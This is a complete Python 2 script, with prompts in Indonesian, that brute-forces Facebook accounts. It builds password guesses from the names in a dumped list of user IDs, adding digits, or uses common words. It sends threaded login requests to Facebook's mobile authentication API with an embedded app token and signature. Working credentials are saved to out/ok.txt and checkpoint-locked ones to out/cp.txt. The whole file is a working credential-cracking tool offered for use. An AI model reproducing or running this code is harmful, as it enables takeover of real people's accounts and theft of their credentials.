#!usr/bin/python2.7
# coding=utf-8

import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:
	def __init__(self):
		self.setpw = False
		self.ok = []
		self.cp = []
		self.loop = 0

	def bruteRequest(self, username, password):
		params = {
			'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'format': 'JSON',
			'sdk_version': '2',
			'email': username,
			'locale': 'en_US',
			'password': password,
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		try: os.mkdir('out')
		except: pass
		api = 'https://b-api.facebook.com/method/auth.login'
		response = requests.get(api, params=params)
		if re.search('(EAAA)\w+', response.text):
			self.ok.append(username+'◊'+password)
			save = open('out/ok.txt','a')
			save.write(str(username)+'◊'+str(password)+'\n')
			save.close()
			return True
		elif 'www.facebook.com' in response.json()['error_msg']:
			self.cp.append(username+'◊'+password)
			save = open('out/cp.txt','a')
			save.write(str(username)+'◊'+str(password)+'\n')
			save.close()
			return True
		else: return False

	def brute(self, users):
		if self.setpw == False:
			self.loop +=1
			for pw in users['pw']:
				username = users['id'].lower()
				password = pw.lower()
				try:
					if self.bruteRequest(username, password) == True:
						break
				except: pass
				sys.stdout.write(
					'\r\033[0;95m\xe2\x80\xa2 \033[0;96m{}\033[0m \033[0;92mProcces\033[0;93m [\033[0;97m{}\033[0;93m/\033[0;97m{}\033[0;93m]\033[0;95m\xe2\x80\xa2\033[0;92m[\033[0;92mOK\033[0;91m:\033[0;92m{}]\033[0;95m\xe2\x80\xa2\033[0;91m[\033[0;93mCP\033[0;91m:\033[0;93m{}\033[0;91m]'.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
				); sys.stdout.flush()
		else:
			self.loop +=1
			for pw in self.setpw:
				username = users['id'].lower()
				password = pw.lower()
				try:
					if self.bruteRequest(username, password) == True:
						break
				except: pass
				sys.stdout.write(
					'\r\033[0;95m\xe2\x80\xa2 \033[0;96m{}\033[0m \033[0;92mProcces \033[0;93m[\033[0;97m{}\033[0;93m/\033[0;97m{}\033[0;93m]\033[0;95m\xe2\x80\xa2\033[0;92m[\033[0;92mOK\033[0;91m:\033[0;92m{}]\033[0;95m\xe2\x80\xa2\033[0;91m[\033[0;93mCP\033[0;91m:\033[0;93m{}\033[0;91m]'.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
				); sys.stdout.flush()

	def main(self):
		while True:
			file = raw_input('\n\033[0;95m\xe2\x80\xa2 \033[0;91mPringatan !\n\033[0;95m\xe2\x80\xa2 \033[0;97mSebelum Mulai Crack, Anda Di Haruskan \n\033[0;95m\xe2\x80\xa2 \033[0;97mDump Id Terlebih Dahulu\n\n\033[0;95m\xe2\x80\xa2 \033[0;97mMasukan file hasil dump tadi\n\033[0;95m\xe2\x80\xa2 \033[0;97mContoh\033[0;91m : \033[0;92mdump/xxnx.json\033[0;97m\n\033[0;95m\xe2\x80\xa2 \033[0;97mFile dump\033[0;91m :\033[0;92m ')
			try:
				list = open(file, 'r').read()
				object = json.loads(list)
				break
			except IOError:
				print("\033[0;95m\xe2\x80\xa2 \033[0;91mfile '%s' tidak ada!\033[0m"% file)
		self.target = []
		for user in object:
			try:
				obj = user['name'].split(' ')
				if len(obj) == 1:
					listpass = [
						obj[0]+'123', obj[0]+'1234',
						obj[0]+'12345',
					]
				elif len(obj) == 2:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
					]
				elif len(obj) == 3:
					listpass = [
						obj[0]+'1234', obj[0]+'12345',
						obj[1]+'123', obj[1]+'1234',
						obj[2]+'123', obj[2]+'12345',
					]
				elif len(obj) == 4:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'1234',
						obj[2]+'1234', obj[2]+'12345',
						obj[3]+'123', obj[3]+'12345',
					]
				else:
					listpass = [
						'Sayang', 'Bismillah', 'Anjing',
						'Bangsat', 'Kontol'
					]
				self.target.append({'id': user['uid'], 'pw': listpass})
			except: pass
		if len(self.target) == 0:
			exit("\n\033[0;95m\xe2\x80\xa2 \033[0;91mId tidak ditemukan dalam file '%s'\033[0m"% file)
		ask = raw_input('\033[0;95m\xe2\x80\xa2\033[0;97m List Pass Default atau Manual \033[0;97m[\033[0;92mD\033[0;97m/\033[0;91mM\033[0;97m] \033[0;91m:\033[0;93m\033[0m ')
		print(' ')
		if ask.lower() == 'm':
			while True:
				print('\033[0;95m\xe2\x80\xa2 \033[0;97mMasukan password yang tertera dibawah ini ! \n\033[0;95m\xe2\x80\xa2 \033[0;93mSayang\033[0;91m,\033[0;93mBismillah\033[0;91m,\033[0;93mBangsat\033[0;91m,\033[0;93mKontol\033[0;91m,\033[0;93mAnjing')
				self.setpw = raw_input('\033[0;95m\xe2\x80\xa2 \033[0;97mPassword \033[0;91m:\033[0;93m ').strip().split(',')
				print(' ')
				if self.setpw[0] != '':
					break
				
		th(30).map(self.brute, self.target)
		self.results()
		exit()

	def results(self):
		if (len(self.ok) != 0):
			print('\n\033[0;95m\xe2\x80\xa2 \033[0;92m--> \033[0;92m[\033[0;92mOK\033[0;92m]\033[0;92m ◊ '+str(len(self.ok)))
			for i in self.ok: print('\033[0;95m\xe2\x80\xa2 \033[0;92m--> \033[0;92m[\033[0;92mOK\033[0;92m]\033[0;97m ' +str(i)+' ')
			print('\033[0;95m\xe2\x80\xa2 \033[0;92m\033[0;97mOK\033[0;97m Anda disimpan di \033[0;91m: \033[0;92mout/ok.txt')
		if (len(self.cp) != 0):
			print('\n\033[0;95m\xe2\x80\xa2 \033[0;93m--> \033[0;91m[\033[0;93mCP\033[0;91m] \033[0;91m◊ \033[0;97m'+str(len(self.cp)))
			for i in self.cp: print('\033[0;95m\xe2\x80\xa2 \033[0;93m-->\033[0;91m[\033[0;93mOK\033[0;91m]\033[0;97m '+str(i)+' ')
			print('\033[0;95m\xe2\x80\xa2 \033[0;91m\033[0;97mOK\033[0;97m Anda disimpan di\033[0;91m : \033[0;93mout/cp.txt')
		if (len(self.cp) == 0 and len(self.ok) == 0):
			print('\n\033[0;95m\xe2\x80\xa2 \033[0;91mTidak ada hasil.\033[0m')
			